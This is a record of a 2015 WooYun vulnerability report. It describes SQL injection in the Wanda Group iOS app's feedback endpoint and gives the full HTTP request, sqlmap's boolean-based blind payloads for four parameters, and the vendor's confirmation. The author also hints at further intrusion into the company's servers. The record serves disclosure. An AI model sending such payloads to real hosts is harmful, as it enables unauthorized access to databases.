{"id": 46689, "wybug_id": "wooyun-2015-089880", "wybug_title": "APP终结者15#万达集团APP云端主站多处sql注入03", "wybug_corp": "大连万达集团股份有限公司", "wybug_author": "zzR", "wybug_date": "2015-01-04 10:51", "wybug_open_date": "2015-02-18 10:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "云端安全", "你爱我咩"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-18：\t细节向公众公开  简要描述： 你爱我吗？ 详细说明：  万达集团 ios app  v2.2\nPOST /wanda3v/h/addfeedback.html HTTP/1.1Host: app.wanda.cnProxy-Connection: closeAccept-Encoding: gzipContent-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 229Connection: closeCookie: Hm_lpvt_cd44f738169a36ff869eee3ca6afb9b1=1420337769; Hm_lvt_cd44f738169a36ff869eee3ca6afb9b1=1420118152,1420337420,1420337769User-Agent: ä¸è¾¾éå¢ 2.2 rv:7045 (iPhone; iPhone OS 8.1.2; zh_CN)devid=192F4332-50C9-45D5-9CE5-02BAE96B5C2E&devicetype=0&resolution=1136%2A640&appversion=2.2&devtype=0&content=fs&vid=7d996adaf86b44d2913a6366808926d5&email=1221%40qq.com&sysversion=8.1.2&phonemodel=iPhone%206&systype=iPhone%20OS\n多个参数存在sql注入   漏洞证明：  \nsqlmap identified the following injection points with a total of 7629 HTTP(s) requests:---Parameter: content (POST)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: devid=192F4332-50C9-45D5-9CE5-02BAE96B5C2E&devicetype=0&resolution=1136*640&appversion=2.2&devtype=0&content=fs' RLIKE (SELECT (CASE WHEN (7172=7172) THEN 0x6673 ELSE0x28 END)) AND 'Vgrh'='Vgrh&vid=7d996adaf86b44d2913a6366808926d5&email=1221@qq.com&sysversion=8.1.2&phonemodel=iPhone 6&systype=iPhone OSParameter: devicetype (POST)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: devid=192F4332-50C9-45D5-9CE5-02BAE96B5C2E&devicetype=0' RLIKE (SELECT (CASEWHEN (7522=7522) THEN 0 ELSE 0x28 END)) AND 'CAqA'='CAqA&resolution=1136*640&appversion=2.2&devtype=0&content=fs&vid=7d996adaf86b44d2913a6366808926d5&email=1221@qq.com&sysversion=8.1.2&phonemodel=iPhone 6&systype=iPhone OSParameter: vid (POST)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: devid=192F4332-50C9-45D5-9CE5-02BAE96B5C2E&devicetype=0&resolution=1136*640&appversion=2.2&devtype=0&content=fs&vid=7d996adaf86b44d2913a6366808926d5' RLIKE (SELECT (CASE WHEN (4488=4488) THEN 0x3764393936616461663836623434643239313361363336363830383932366435 ELSE 0x28 END)) AND 'UkkU'='UkkU&email=1221@qq.com&sysversion=8.1.2&phonemodel=iPhone 6&systype=iPhone OSParameter: email (POST)    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: devid=192F4332-50C9-45D5-9CE5-02BAE96B5C2E&devicetype=0&resolution=1136*640&appversion=2.2&devtype=0&content=fs&vid=7d996adaf86b44d2913a6366808926d5&email=1221@qq.com' RLIKE (SELECT (CASE WHEN (8648=8648) THEN 0x313232314071712e636f6d ELSE 0x28 END)) AND 'MtMZ'='MtMZ&sysversion=8.1.2&phonemodel=iPhone 6&systype=iPhone OS---[10:34:09] [WARNING] changes made by tampering scripts are not included in shown payload content(s)there were multiple injection points, please select the one to use for following injections:[0] place: POST, parameter: devicetype, type: Single quoted string (default)[1] place: POST, parameter: content, type: Single quoted string[2] place: POST, parameter: vid, type: Single quoted string[3] place: POST, parameter: email, type: Single quoted string[q] Quit>[10:34:26] [INFO] testing MySQL[10:34:26] [INFO] confirming MySQL[10:34:26] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL >= 5.0.0\n\n\n目测和前面getshell 的服务器不是同一台内网服务器，有搞头   修复方案：  下线更新吧！   版权声明：转载请注明来源 zzR@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-01-04 10:53 厂商回复： 感谢zzR同学的关注与贡献！马上通知业务整改! 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}